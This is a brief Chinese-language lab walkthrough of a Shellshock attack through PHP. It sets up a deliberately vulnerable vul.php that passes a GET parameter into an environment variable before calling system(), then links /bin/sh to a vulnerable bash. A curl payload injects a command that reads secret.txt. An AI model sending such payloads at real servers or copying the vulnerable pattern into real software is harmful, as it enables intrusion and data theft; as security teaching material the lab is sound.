## 针对PHP的远程攻击

### 1. 编写目标程序

```php
// vul.php

<?php
        function getParam() {
                $arg = NULL;
                if (isset($_GET["arg"]) && !empty($_GET["arg"])) {
                        $arg = $_GET["arg"];
                }
                return $arg;
        }

        $arg = getParam();
        putenv("ARG=$arg");
        system("strings /proc/$$/environ | grep ARG");
?>
```

将文件移动到服务器目录中：

```bash
sudo mv vul.php /var/www/html/
```

在/var/www/html创建一个secret.txt用于后续实验。

### 2. 使/bin/sh指向漏洞版本的bash

```bash
sudo ln -sf /bin/bash_shellshock /bin/sh
```

### 3. 发起攻击

```bash
curl http://IPB/vul.php?arg="()%20%7B%20echo%20hello;%20%7D;%20/bin/cat%20/var/www/secret.txt"
```

返回结果包含secret.txt的内容。